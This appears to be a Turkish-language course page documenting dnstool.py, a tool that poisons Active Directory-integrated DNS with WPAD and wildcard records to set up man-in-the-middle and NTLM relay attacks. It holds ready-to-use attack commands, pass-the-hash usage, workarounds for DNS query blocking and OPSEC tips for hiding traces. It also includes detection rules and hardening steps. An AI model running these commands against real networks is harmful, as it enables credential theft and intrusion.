# dnstool.py

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Dirk-jan Mollema (@_dirkjan) tarafından geliştirilen; Active Directory ile Bütünleşik DNS (ADIDNS) ortamında standart etki alanı kullanıcısı yetkisiyle LDAP üzerinden yeni DNS kayıtları ekleyen, değiştiren, silen ve Wildcard (*) ya da WPAD zehirlemesiyle MitM/Relay saldırılarına zemin hazırlayan Python aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında Etki Alanı ile Bütünleşik DNS (**ADIDNS**) bölgeleri varsayılan olarak tüm etki alanı kullanıcılarına açık bir mimariye sahiptir. `CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local` uygulama bölümünde yer alan güvenlik izinleri (DACL), standart bir `Domain Users` üyesinin dahi kendi kontrolünde yeni DNS nesneleri (`dnsNode`) oluşturmasına (**CreateChild** izni) olanak tanır.

**dnstool.py** (krbrelayx araç setinin bir parçası), bu mimari esnekliği suistimal ederek sızma testi uzmanlarının ve kırmızı takımların dinamik DNS güncellemelerini LDAP protokolü üzerinden doğrudan Active Directory veritabanına enjekte etmesini sağlar. Araç sayesinde operatör; LLMNR veya NBT-NS gibi yerel ağ zehirleme protokollerinin kapatıldığı ortamlarda resmi DNS sunucusu üzerinden **WPAD (Web Proxy Auto-Discovery)** kaydı veya **Wildcard (`*`) DNS** kaydı tanımlayarak ağ trafiğini kendi dinleyicisine yönlendirebilir ve kimlik doğrulama aktarımı (NTLM Relay) saldırılarını tetikleyebilir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                             DNSTOOL.PY ÇALIŞMA MİMARİSİ                           |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / Kali Linux / Sızma Testçisi]
                 dnstool.py -u user -p pass -a add -r wpad -d 10.10.10.50
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Kimlik Doğrulama Mekanizması                               |
|        - Standart Etki Alanı Kullanıcısı (Açık Metin Parola)                      |
|        - NTLM Hash / Pass-the-Hash (-H)                                           |
|        - Kerberos Bileti / ccache (-k --no-pass)                                  |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        LDAP / LDAPS Bağlantısı (TCP 389 / 636)                    |
|        (CreateChild İzni ile DC=DomainDnsZones Kapsayıcısına Erişim)              |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                              Hedef Etki Alanı Denetleyicisi                        |
|   1. dnsNode Nesnesi Oluşturulur (CN=wpad,DC=corp.local,CN=MicrosoftDNS,...)     |
|   2. dnsRecord İkili Blobu Yazılır (Type: A, IP: 10.10.10.50, Serial: +1)        |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Active Directory DNS Replikasyonu                          |
|             (Tüm DC'lere ve DNS Sunucularına Anında Senkronizasyon)               |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                     Saldırı Vektörleri & Trafik Ele Geçirme                       |
|  - WPAD Proxy Zehirleme (İstemciler Web Trafiğini Saldırgana Gönderir)            |
|  - Wildcard (*) Zehirleme (Çözülemeyen Tüm Host İsimleri Saldırgana Yönlenir)     |
|  - Subdomain Takeover & NTLM Relay Tetikleme (Responder / ntlmrelayx)            |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Saldırı / MitM Boyutu |
|---|---|---|
| **Resmi DNS Üzerinden Zehirleme** | LLMNR/NBT-NS gibi güvensiz yayın protokollerine gerek kalmaz. | Güvenlik duvarlarını ve subnet sınırlarını aşarak etki alanı çapında MitM sağlar. |
| **WPAD İstismarı** | Ağda tanımlı olmayan `wpad` kaydını kendi IP'sine kaydeder. | İstemcilerden açık metin HTTP/Proxy kimlik doğrulaması ve NetNTLMv2 toplar. |
| **Wildcard (*) Kaydı Enjeksiyonu**| `*.corp.local` kaydı ekleyerek çözülemeyen tüm istekleri çeker. | Ağdaki hatalı yazılmış veya sahipsiz tüm iç istekleri saldırgana akıtır. |
| **Kayıt Yönetimi ve Temizlik** | `add`, `modify`, `delete` ve `resurrect` desteği sunar. | Operasyon bittiğinde eklenen sahte DNS kaydını iz bırakmadan kaldırır. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | dnstool.py | Powermad (PowerShell) | nsupdate (Dynamic DNS) | Responder | adidnsdump |
|---|---|---|---|---|---|
| **Platform** | Linux / Python | Windows / PS | Linux / Bind9 | Linux / Python | Linux / Python |
| **Kullanılan Protokol** | LDAP / LDAPS | LDAP / ADSI | DNS (TCP/UDP 53) | LLMNR, NBT-NS, mDNS | LDAP (Salt Okunur) |
| **Yetki Gereksinimi** | Standart Domain User | Standart Domain User | Dynamic Update İzni | Ağda Yerel Yayın | Standart Domain User |
| **Kapsam** | Etki Alanı Çapında | Etki Alanı Çapında | Sadece DNS Bölgesi | Yalnızca Yerel Subnet | Salt Keşif |
| **Zehirleme Yeteneği** | **Mükemmel (ADIDNS)** | **Mükemmel (ADIDNS)** | Orta | Yüksek (Yerel Ağ) | Yok (Okuma Odaklı) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

dnstool.py doğrudan terminalden eylem ve hedef parametreleriyle çağrılır:

```bash
dnstool.py [eylem_ve_kayıt_seçenekleri] [bağlantı_seçenekleri] [hedef_dc]
```

### 2.1 Eylem Parametreleri (`-a`, `--action`)

| Eylem (Action) | Açıklama |
|---|---|
| `add` | Bölgeye tamamen yeni bir DNS kaydı ekler (`dnsNode` oluşturur). |
| `modify` | Mevcut bir DNS kaydının IP adresini veya hedefini günceller. |
| `delete` | Belirtilen DNS kaydını siler (Tombstoned durumuna çeker). |
| `query` | Belirtilen kaydın DNS detaylarını sorgular. |
| `ldapquery` | Kaydın ham LDAP özniteliklerini döker. |
| `resurrect` | Silinmiş (tombstoned) durumdaki bir DNS kaydını yeniden canlandırır. |

### 2.2 Kayıt ve Yapılandırma Parametreleri

| Parametre | Kısa Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| `--record` | `-r` | Eklenecek veya değiştirilecek DNS kayıt adı. | `-r "wpad"` / `-r "*"` |
| `--data` | `-d` | Kayda atanacak IP adresi veya hedef sunucu adı. | `-d "10.10.10.50"` |
| `--type` | `-t` | DNS kayıt türü (`A`, `AAAA`, `CNAME`, `TXT`, `PTR`, `SRV`). | `-t A` (Varsayılan) |
| `--zone` | `-z` | Hedef DNS bölgesi adı (Varsayılan: etki alanı adı). | `-z "corp.local"` |
| `--ttl` | | DNS kaydının geçerlilik süresi (Time to Live). | `--ttl 300` |
| `--forest` | | `DomainDnsZones` yerine `ForestDnsZones` bölümünü hedefler. | *(Anahtar bayrak)* |

### 2.3 Kimlik Doğrulama Parametreleri

| Parametre | Kısa Bayrak | Açıklama | Örnek Kullanım |
|---|---|---|---|
| `--user` | `-u` | Kimlik doğrulamada kullanılacak kullanıcı adı (`DOMAIN\user`). | `-u "corp\ahmet"` |
| `--password` | `-p` | İlgili kullanıcının açık metin parolası. | `-p "Parola123!"` |
| `--hashes` | `-H` | NTLM kimlik doğrulama hash'i (Pass-the-Hash). | `-H ":8846f7eaee..."` |
| `--kerberos` | `-k` | NTLM yerine Kerberos kimlik doğrulaması kullanma. | `-k` |
| `--no-pass` | | Parola girmeden `KRB5CCNAME` biletini kullanır. | `--no-pass` |
| `--ssl` | | Şifreli LDAPS (TCP 636) bağlantısını zorlar. | `--ssl` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Kullanıcı ile Yeni Bir DNS A Kaydı Ekleme

Saldırı makinesinin IP adresini gösteren yeni bir meşru DNS A kaydı (`testbox.corp.local`) oluşturma:

```bash
dnstool.py -u "corp.local\ahmet" -p "Parola123!" -a add -r testbox -d 10.10.10.50 10.10.10.10
```

**Konsol Çıktısı Analizi:**

```text
[-] Connecting to host...
[-] Binding to host...
[+] Bind OK
[-] Adding new record
[+] LDAP add record result: SUCCESS
[*] Successfully added record testbox.corp.local with IP 10.10.10.50
```
*Analiz: Dizin üzerinde `CN=testbox,DC=corp.local,CN=MicrosoftDNS,...` nesnesi başarıyla oluşturulmuştur. Artık etki alanındaki tüm bilgisayarlar `testbox.corp.local` adresini 10.10.10.50 IP'si olarak çözecektir.*

### Senaryo 2: WPAD Kaydı Enjekte Ederek Ağ Çapında Web Trafiği Ele Geçirme

Ağda WPAD kaydı tanımlı değilse, bu ismi kendi kontrolündeki Responder dinleyicisine yönlendirerek kimlik doğrulama toplama:

```bash
# 1. WPAD DNS A kaydını ekleme
dnstool.py -u "corp\ahmet" -p "Parola123!" -a add -r wpad -d 10.10.10.50 10.10.10.10

# 2. Saldırgan makinesinde Responder'ı WPAD moduyla başlatma
responder -I eth0 -wFb
```

### Senaryo 3: Wildcard (`*`) DNS Kaydı Ekleyerek Çözülemeyen İstekleri Yakalama

Etki alanında yanlış yazılan veya bulunamayan tüm DNS sorgularını saldırgan IP'sine yönlendiren Wildcard A kaydı ekleme:

```bash
dnstool.py -u "corp\ahmet" -p "Parola123!" -a add -r "*" -d 10.10.10.50 10.10.10.10
```
> [!WARNING]
> **Kritik Risk:** Wildcard (`*`) kaydı ağ genelinde çözülemeyen her türlü DNS sorgusunu (iç uygulamalar, güvenlik güncellemeleri, telemetry) saldırgan sunucusuna yönlendireceği için çok yüksek ağ gürültüsü ve kesinti riski taşır!

### Senaryo 4: Mevcut Bir DNS Kaydının IP Adresini Değiştirme (Modify)

Operatör kendi makinesinin IP'si değiştiğinde daha önce eklediği kaydı yeni IP ile güncelleme:

```bash
dnstool.py -u "corp\ahmet" -p "Parola123!" -a modify -r testbox -d 10.10.10.99 10.10.10.10
```

### Senaryo 5: Operasyon Tamamlandığında Eklenen Kaydı Temizleme (Delete)

Sızma testi veya kırmızı takım görevi bittiğinde sisteme eklenen sahte DNS kaydını silme:

```bash
dnstool.py -u "corp\ahmet" -p "Parola123!" -a delete -r wpad 10.10.10.10
```

### Senaryo 6: Pass-the-Hash ile Şifreli LDAPS Üzerinden Kayıt Yönetimi

Açık metin parola olmadan NTLM hash ile güvenli bağlantı üzerinden kayıt ekleme:

```bash
dnstool.py -u "corp\mehmet" -H ":8846f7eaee8fb117ad06bdd830b7586c" --ssl -a add -r devsvc -d 10.10.10.50 dc01.corp.local
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `LDAP_ALREADY_EXISTS (68) / Node already exists` | Ekelenmek istenen DNS kayıt adı (örneğin `wpad`) bölgede zaten mevcut. | Kayıt zaten varsa `-a add` yerine `-a modify` deneyin (ancak mevcut kaydın sahibi değilseniz veya ACL izin vermiyorsa yetki hatası alırsınız). |
| `LDAP_INSUFFICIENT_RIGHTS (50) - Access Denied` | Hedef DNS bölgesinde `CreateChild` izni standart kullanıcılara kapatılmış veya kısıtlanmış. | Farklı bir kullanıcı deneyin ya da izin verilen spesifik bir alt bölgeyi (`-z sub.corp.local`) hedefleyin. |
| `WPAD kaydı eklendi ancak istemciler IP'yi çözmüyor` | Windows DNS Server üzerinde **Global Query Block List (GQBL)** varsayılan olarak WPAD ve ISATAP isimlerini engeller. | DNS sunucusu GQBL özelliğini kapatmadıkça WPAD kaydı yanıtsız kalır. Bu durumda WPAD yerine Wildcard (`*`) veya yaygın bir servis adı (örneğin `sharepoint-dev`) kullanın. |
| `LDAPBindError: invalidCredentials` | Kullanıcı adı veya parola hatalı ya da hesap kilitli. | UPN (`user@corp.local`) formatını kontrol edin ve paroladaki özel karakterleri tek tırnak içine alın. |
| `Record added but nslookup does not return the IP immediately` | Active Directory DNS servisi LDAP değişikliklerini anında belleğe yüklemez; DNS polling döngüsünü (varsayılan: 180 saniye) bekler. | 1-3 dakika bekleyin veya etki alanındaki diğer etki alanı denetleyicilerinin replikasyonunu kontrol edin. |
| `SSL: CERTIFICATE_VERIFY_FAILED on --ssl` | DC'nin ürettiği sertifika Python güven havuzunda tanınmıyor. | Hedef olarak DC IP'si yerine tam FQDN adını (`dc01.corp.local`) verin veya port 389 standart LDAP'a dönün. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

dnstool.py, Active Directory veritabanına **doğrudan yazma (write) işlemi yaptığı için** tespit edilme riski salt okunur keşif araçlarına göre oldukça yüksektir.

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 5136 (Directory Service Object Created / Modified):**
   - DC Denetim Günlüklerinde, `CN=MicrosoftDNS,DC=DomainDnsZones...` altında yeni bir `dnsNode` nesnesi oluşturulduğunda **Event ID 5136** üretilir. Log detayında işlemi yapan kullanıcı hesabı (`SubjectUserName`), oluşturulan kayıt adı (`wpad`, `*`) ve hedef IP adresi (`AttributeValue`) açıkça kaydedilir.
2. **Windows Security Event ID 4624 (Logon Type 3):**
   - DC LDAP servisine yapılan ağ oturumu kaydı.
3. **DNS Server Analytic / Audit Logs:**
   - Windows DNS Server analitik logları aktifse, statik kaydın bölgeye eklendiği kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **LDAP Add / Modify Paketleri:** Port 389 veya 636 üzerinden gönderilen `LDAPAddRequest` paketleri IDS sistemleri tarafından yakalanabilir.
- **Ağ Genelinde Trafik Anomalisi:** Özellikle Wildcard (`*`) veya WPAD eklendiğinde, ağdaki yüzlerce iş istasyonunun aniden saldırgan IP'sine HTTP/SMB istekleri göndermeye başlaması SIEM/NDR üzerinde devasa bir anomali oluşturur.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | dnstool.py Kullanımı |
|---|---|---|
| **T1557** | Adversary-in-the-Middle | WPAD ve Wildcard enjeksiyonu ile trafik yakalama |
| **T1584.004** | Compromise Infrastructure: DNS Server | ADIDNS bölgesine yetkisiz DNS kaydı enjekte etme |
| **T1098** | Account Manipulation / Infrastructure Manipulation | DNS kayıtlarının değiştirilmesi ve silinmesi |
| **T1078.002** | Valid Accounts: Domain Accounts | Meşru kullanıcı haklarıyla LDAP'a kayıt yazma |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **Wildcard (*) Trafik Patlaması** | Ağdaki tüm çözülemeyen trafiğin saldırgan IP'sine hücum etmesi. | Hassas kırmızı takım operasyonlarında **asla** Wildcard (`*`) kaydı açmayın; yalnızca hedefli tekil host adları tanımlayın. |
| **Event ID 5136 İzi** | Dizin üzerinde nesne oluşturulması. | İşiniz bittiğinde oluşturduğunuz kaydı **istisnasız** `-a delete` ile silin; kaydın kalıcı olarak ağda kalmasını önleyin. |
| **Düz Metin LDAP İzlemesi** | Port 389 trafiğinin incelenmesi. | Daima `--ssl` bayrağı ile LDAPS şifrelemesi kullanın. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

ADIDNS üzerine eklenen şüpheli DNS nesnelerini (özellikle WPAD veya Wildcard) tespit eden örnek Sigma kuralı:

```yaml
title: Suspicious ADIDNS Record Created (WPAD or Wildcard)
id: d7381ab9-dnstool-wpad-wildcard
status: experimental
description: Detects the creation of suspicious ADIDNS records such as 'wpad' or '*' via Event ID 5136.
logsource:
    product: windows
    service: directory_service
detection:
    selection:
        EventID: 5136
        ObjectDN|contains: 'CN=MicrosoftDNS'
        ObjectDN|contains:
            - 'CN=wpad,'
            - 'CN=\*,'
            - 'CN=isatap,'
    condition: selection
level: critical
```

Sertleştirme önerileri:
1. **Global Query Block List (GQBL) Açık Tutulmalıdır:** WPAD ve ISATAP sorgularının DNS tarafından çözülmesi engellenmelidir (`dnscmd /config /enableglobalqueryblocklist 1`).
2. **DACL Sıkılaştırması:** `DomainDnsZones` kapsayıcısında standart kullanıcılardan `Create all child objects` iznini kaldırın.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Yeni Bir DNS A Kaydı Ekleme (add)
dnstool.py -u "corp\user" -p "pass" -a add -r evilbox -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** Bölgeye `evilbox.corp.local` adında yeni bir A kaydı ekler.
- **Ne Zaman Kullanılır?** Saldırı makineleri veya dinleyiciler için resmi bir iç ağ DNS kaydı gerektiğinde.
- **Parametreler:** `-a add` kayıt ekleme modu; `-r` kayıt adı; `-d` hedef IP adresi.

```bash
# 2. WPAD DNS A Kaydı Enjeksiyonu ile MitM Hazırlığı
dnstool.py -u "corp\user" -p "pass" -a add -r wpad -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** `wpad.corp.local` kaydı oluşturarak web proxy trafiğini ele geçirmeyi sağlar.
- **Ne Zaman Kullanılır?** LLMNR kapalıyken Responder ile NTLM kimlik doğrulama toplamak için.
- **Parametreler:** `-r wpad` hedef WPAD kayıt adı.

```bash
# 3. Wildcard (*) DNS Kaydı Ekleyerek Tüm Çözülemeyen İstekleri Yakalama
dnstool.py -u "corp\user" -p "pass" -a add -r "*" -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** Çözülemeyen tüm alt etki alanı sorgularını operatör IP'sine yönlendirir.
- **Ne Zaman Kullanılır?** Etki alanı çapında kitle trafik yönlendirme denemelerinde (Çok Yüksek Risk!).
- **Parametreler:** `-r "*"` joker kayıt belirteci.

```bash
# 4. Eklenen Sahte DNS Kaydını Silme (Temizlik / Cleanup)
dnstool.py -u "corp\user" -p "pass" -a delete -r wpad 10.10.10.10
```
- **Ne Yapar?** Önceden eklenen kaydı AD veritabanından kaldırır (tombstoned yapar).
- **Ne Zaman Kullanılır?** Test bittiğinde IOC izlerini temizlemek için.
- **Parametreler:** `-a delete` silme eylemi.

```bash
# 5. Mevcut Kaydın IP Adresini Güncelleme (modify)
dnstool.py -u "corp\user" -p "pass" -a modify -r evilbox -d 10.10.10.99 10.10.10.10
```
- **Ne Yapar?** Var olan kaydın IP hedefini yeni bir IP ile değiştirir.
- **Ne Zaman Kullanılır?** Saldırgan makinesinin IP adresi değiştiğinde kaydı taşımak için.
- **Parametreler:** `-a modify` değiştirme modu.

```bash
# 6. Belirli Bir DNS Kaydının Detaylarını Sorgulama (query)
dnstool.py -u "corp\user" -p "pass" -a query -r wpad 10.10.10.10
```
- **Ne Yapar?** İlgili kaydın mevcut IP'sini, TTL değerini ve durumunu gösterir.
- **Ne Zaman Kullanılır?** Kaydın önceden var olup olmadığını doğrulamak için.
- **Parametreler:** `-a query` sorgu modu.

```bash
# 7. Şifreli LDAPS (Port 636) Üzerinden Kayıt Ekleme
dnstool.py -u "corp\user" -p "pass" --ssl -a add -r mybox -d 10.10.10.50 dc01.corp.local
```
- **Ne Yapar?** Kayıt enjeksiyonunu TLS şifreli tünel üzerinden yaparak ağ sniffer'larından gizler.
- **Ne Zaman Kullanılır?** Ağ üzerinde aktif IDS/NDR izlemesi olan hassas ortamlarda.
- **Parametreler:** `--ssl` port 636 LDAPS şifrelemesi.

```bash
# 8. Pass-the-Hash (NTLM Hash) ile Kayıt Yönetimi
dnstool.py -u "corp\user" -H ":nt_hash" -a add -r test -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** Açık metin parola olmadan NTLM hash ile kimlik doğrulayıp DNS kaydı ekler.
- **Ne Zaman Kullanılır?** Sadece NTLM hash elde edildiğinde Pass-the-Hash ile çalışırken.
- **Parametreler:** `-H` NTLM hash değeri.

```bash
# 9. Belirli Bir Alt Bölgeye (Sub-Zone) Kayıt Ekleme
dnstool.py -u "corp\user" -p "pass" -a add -z "dev.corp.local" -r apisvc -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** Ana etki alanı yerine belirtilen alt DNS bölgesine kayıt enjekte eder.
- **Ne Zaman Kullanılır?** Yalnızca alt geliştirme veya test bölgesinde yetki olduğunda.
- **Parametreler:** `-z` hedef DNS bölgesi adı.

```bash
# 10. Silinmiş (Tombstoned) Bir Kaydı Yeniden Canlandırma (resurrect)
dnstool.py -u "corp\user" -p "pass" -a resurrect -r oldportal -d 10.10.10.50 10.10.10.10
```
- **Ne Yapar?** Silinmiş durumdaki bayat bir kaydı kendi IP'nize atayarak tekrar aktif hale getirir.
- **Ne Zaman Kullanılır?** Subdomain devralma (takeover) senaryolarında.
- **Parametreler:** `-a resurrect` canlandırma modu.

---

## Kaynaklar

- **Resmi GitHub Reposu (krbrelayx):** [dirkjanm / krbrelayx - dnstool.py](https://github.com/dirkjanm/krbrelayx)
- **Dirk-jan Mollema ADIDNS İstismarı:** [Exploiting Active Directory Integrated DNS](https://dirkjanm.io/exploiting-active-directory-integrated-dns/)
- **Microsoft ADIDNS Mimarisi:** [Active Directory Integrated DNS Overview](https://learn.microsoft.com/en-us/windows-server/networking/dns/dns-top)
- **MITRE ATT&CK Framework:** [Technique T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/)

---

> **Önceki:** [← adidnsdump](./adidnsdump.md) · **Sonraki:** [Kerbrute →](./Kerbrute.md)
